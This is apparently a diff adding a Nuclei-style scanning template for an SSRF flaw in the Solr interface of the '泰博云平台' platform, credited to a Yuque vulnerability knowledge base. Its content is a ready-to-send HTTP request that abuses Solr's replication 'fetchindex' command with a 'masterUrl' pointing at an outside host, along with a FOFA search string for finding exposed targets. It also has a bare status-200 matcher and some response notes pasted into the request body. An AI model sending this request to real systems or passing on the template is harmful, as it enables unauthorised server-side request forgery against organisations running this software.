@@ -1,0 +1,55 @@
+id: poc-vm07lbli0pbgpq58
+info:
+  name: 泰博云平台solr接口SSRF漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vm07lbli0pbgpq58'
+  tags: ssrf,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vm07lbli0pbgpq58
+    fofa: title="泰博云平台"
+http:
+- raw:
+  - 'GET /solr/collection1/replication/?command=fetchindex&masterUrl=http://www.baidu.com HTTP/1.1
+
+
+    Cache-Control: max-age=0
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+
+
+    Cookie: JSESSIONID=1535i08jjweib
+
+
+    Connection: close
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
